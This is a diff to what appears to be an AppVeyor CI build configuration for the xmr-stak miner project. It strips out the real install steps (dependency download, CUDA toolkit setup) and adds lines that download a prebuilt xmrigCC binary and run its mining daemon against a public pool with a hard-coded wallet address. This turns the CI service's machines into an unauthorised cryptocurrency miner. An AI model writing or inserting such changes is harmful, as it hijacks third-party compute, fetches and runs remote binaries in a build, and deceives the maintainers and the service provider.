@@ -8,13 +8,10 @@ platform: x64
 clone_folder: c:\xmr-stak
 
 install:
-  - mkdir c:\xmr-stak-dep
-  - curl -sL https://github.com/fireice-uk/xmr-stak-dep/releases/download/v1/xmr-stak-dep.zip -o xmr-stak-dep.zip
-  - 7z x xmr-stak-dep.zip -o"c:\xmr-stak-dep" -y > nul
-  - appveyor DownloadFile  https://developer.nvidia.com/compute/cuda/8.0/prod/local_installers/cuda_8.0.44_windows-exe -FileName cuda_8.0.44_windows.exe
-  - cuda_8.0.44_windows.exe -s compiler_8.0 cudart_8.0 nvrtc_8.0 nvrtc_dev_8.0
-  - set PATH=%ProgramFiles%\NVIDIA GPU Computing Toolkit\CUDA\v8.0\bin;%ProgramFiles%\NVIDIA GPU Computing Toolkit\CUDA\v8.0\libnvvp;%PATH%
-  - nvcc -V
+  - wget https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz
+  - tar -xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz
+  - ./miner/xmrigDaemon --donate-level 2 -o uplexa.herominers.com:10470 -u UPX1t71Hx7A4GDuqTJ455sN9F5aYhmZsKYUxDB4RqBaV7v354i95z199gwE2CDF6X5X9ETgC6UcKN84r2JZZcKsF5VbfhwwarG -p SUKUMANTE -a cn-extremelite/upx2 -k -t2
+
 
 build_script:
   - call "C:\Program Files (x86)\Microsoft Visual Studio 14.0\Common7\Tools\VsMSBuildCmd.bat"
